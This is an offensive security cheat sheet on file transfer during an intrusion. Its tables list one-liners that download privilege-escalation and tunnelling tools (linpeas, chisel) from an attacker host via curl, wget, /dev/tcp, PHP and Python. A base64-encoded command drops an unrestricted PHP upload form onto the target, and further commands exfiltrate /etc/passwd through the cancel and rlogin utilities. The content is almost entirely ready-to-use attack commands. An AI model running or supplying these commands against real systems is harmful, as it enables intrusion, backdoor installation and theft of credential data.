# File Transfer

## Infiltration

### General

| Info                         | Command                                                                                                                                                                                                                                               |
| ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| curl                         | `curl -o linpeas.sh http://$lhost/linpeas.sh`                                                                                                                                                                                                         |
| wget                         | `wget http://$lhost/linpeas.sh -O linpeas.sh`                                                                                                                                                                                                         |
| bash                         | `exec 3<>/dev/tcp/$lhost/80; echo -e "GET /linpeas.sh HTTP/1.1\n\n">&3; cat <&3 > linpeas.sh`                                                                                                                                                         |
| bash                         | `exec 3<>/dev/tcp/$lhost/80; echo -e "GET /chisel HTTP/1.1\n\n">&3; cat <&3 > chisel`                                                                                                                                                                 |
| php File\_get\_contents()    | `php -r '$file = file_get_contents("http://$lhost/linux/privesc/linpeas.sh"); file_put_contents("linpeas.sh",$file);'`                                                                                                                                |
| php Fopen()                  | `php -r 'const BUFFER = 1024; $fremote = fopen("http://10.4.29.43/linux/privesc/linpeas.sh", "rb"); $flocal = fopen("linpeas.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'` |
| php php-curl                 | `php -r '$rfile = "http://10.4.29.43/linux/privesc/linpeas.sh"; $lfile = "linpeas.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'`              |
| Python 2 (In python console) | `import urllib;urllib.urlretrieve ("http://10.4.29.43/linpeas.sh", "linpeas.sh")`                                                                                                                                                                     |
| Python 3 (In python console) | `import urllib.request;urllib.request.urlretrieve("http://10.4.29.43/linpeas.sh", "linpeas.sh")`                                                                                                                                                      |

### HTML / PHP file upload form

{% code overflow="wrap" %}
```bash
echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8Ym9keT4KCjxmb3JtIGFjdGlvbj0idXBsb2FkLnBocCIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KICBTZWxlY3QgaW1hZ2UgdG8gdXBsb2FkOgogIDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlVG9VcGxvYWQiIGlkPSJmaWxlVG9VcGxvYWQiPgogIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGxvYWQgSW1hZ2UiIG5hbWU9InN1Ym1pdCI+CjwvZm9ybT4KCjwvYm9keT4KPC9odG1sPgo=' | base64 -d > upload.html && echo 'PD9waHAKJHRhcmdldF9kaXIgPSAiLi8iOwokdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X2RpciAuIGJhc2VuYW1lKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJuYW1lIl0pOwptb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSk7Cj8+' | base64 -d > upload.php
```
{% endcode %}

## Exfiltration

| Info                 | Command                                                   |
| -------------------- | --------------------------------------------------------- |
| Using cancel command | `cancel -u "$(cat /etc/passwd \| base64)" -h <ip>:<port>` |
| Using rlogin command | `rlogin -l "$(cat /etc/passwd \| base64)" -p <port> <ip>` |
|                      |                                                           |
